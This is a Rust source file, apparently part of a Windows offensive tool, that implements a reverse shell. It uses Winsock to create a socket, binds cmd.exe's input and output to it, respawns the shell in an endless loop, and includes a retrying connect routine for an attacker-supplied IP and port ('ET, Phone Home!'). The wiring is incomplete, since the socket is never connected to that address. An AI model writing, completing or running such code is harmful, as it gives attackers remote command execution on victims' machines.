// Reverse  shell
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::*;


// https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket/5725609#5725609

// https://stackoverflow.com/questions/50067355/what-methods-do-i-need-to-get-stdio-over-a-tcp-or-udp-stream-on-windows

// Windows based imports
#[cfg(windows)]
extern crate winapi;

#[cfg(windows)]
use std::os::windows::io::FromRawHandle;

#[cfg(windows)]
pub fn shell(ip: String, port: String) {
    // ET, Phone Home!
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){

    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
    let PF_INET = winapi::um::winsock2::PF_INET; // Ipv4
    let IPPROTO_TCP = 6; // TCP-Sock Stream
    let NULL: *mut winapi::um::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
    let version =  winapi::um::winsock2::WINSOCK_VERSION; // Version 2.2 of winsock


    // Random shit
    let mut vendor: i8 = 10; 
    let vendorPtr: *mut i8 = &mut vendor;

    // Mutable data for startup
    let mut data: winapi::um::winsock2::WSADATA = winapi::um::winsock2::WSADATA {
	iMaxSockets: 1,
	iMaxUdpDg: 1,
	szDescription: [
	    126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
	    13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
	    3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
	    2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
	    21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
	    126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
	    126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
	    13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
	    3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
	    2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
	    21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 1,
	    1, 1, 1, 1,
	],
	szSystemStatus: [
	    126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
	    13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
	    3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
	    2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
	    21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
	    126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 1,
	],
	lpVendorInfo: vendorPtr,
	wHighVersion: version,
	wVersion: version
    };

    // Start WSA and WinSock2
    unsafe {
	winapi::um::winsock2::WSAStartup(version, &mut data);
    }

    // Raw Socket for windows
    unsafe {
	let socket = winapi::um::winsock2::WSASocketA(PF_INET, 1, IPPROTO_TCP, NULL, 0, 0);

	let handle: winapi::um::winnt::HANDLE = socket as winapi::um::winnt::HANDLE;


	// Open shell
	Command::new("cmd")
	    .stdin( Stdio::from_raw_handle(handle))
	    .stdout( Stdio::from_raw_handle(handle))
	    .stderr( Stdio::from_raw_handle(handle))
	    .spawn()
	    .unwrap()
	    .wait()
	    .unwrap();
    }



    // println!("Shell exited");
    sh(home);

}

fn connect(home: &String) -> TcpStream {
    let ten_millis = time::Duration::from_millis(1000);

    // Unwrap input
    let stream = TcpStream::connect(&home);
    if stream.is_ok() {
	return stream.unwrap()
    } else {
	thread::sleep(ten_millis);
	connect(&home)
    }
}
